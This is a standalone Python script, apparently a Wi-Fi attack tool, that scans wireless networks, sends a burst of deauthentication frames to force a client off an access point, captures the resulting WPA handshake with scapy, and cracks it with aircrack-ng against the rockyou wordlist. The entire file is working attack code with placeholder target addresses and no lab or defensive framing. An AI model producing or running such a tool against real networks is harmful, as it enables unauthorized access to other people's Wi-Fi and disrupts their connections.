import subprocess
from scapy.all import *
import threading
import time
import os

def scan_networks():
    try:
        networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks', 'mode=Bssid'])
        print(networks.decode('utf-8'))
    except subprocess.CalledProcessError as e:
        print(f"Error scanning networks: {e}")

def packet_handler(packet):
    if packet.haslayer(EAPOL):
        print("Handshake captured")
        wrpcap("handshake.pcap", packet, append=True)

def capture_handshake(interface):
    print("Starting handshake capture...")
    sniff(iface=interface, prn=packet_handler, timeout=60)

def send_deauth_packets(interface, bssid, client_mac):
    print("Sending deauth packets...")
    dot11 = Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1)

def crack_handshake(handshake_file, wordlist, bssid):
    try:
        result = subprocess.check_output(['aircrack-ng', '-w', wordlist, '-b', bssid, handshake_file])
        print(result.decode('utf-8'))
    except subprocess.CalledProcessError as e:
        print(f"Error cracking handshake: {e}")

def main():
    interface = 'wlan0'
    bssid = 'XX:XX:XX:XX:XX:XX'
    client_mac = 'YY:YY:YY:YY:YY:YY'
    wordlist = 'rockyou.txt'
    
    # Scan networks
    scan_networks()
    
    # Capture handshake and send deauth packets
    capture_thread = threading.Thread(target=capture_handshake, args=(interface,))
    capture_thread.start()
    time.sleep(5)  # Give some time for the capture to start
    send_deauth_packets(interface, bssid, client_mac)
    
    # Wait for capture thread to finish
    capture_thread.join()
    
    # Check if handshake file exists
    if os.path.exists('handshake.pcap'):
        # Crack the captured handshake
        crack_handshake('handshake.pcap', wordlist, bssid)
    else:
        print("No handshake captured. Try again.")

if __name__ == "__main__":
    main()
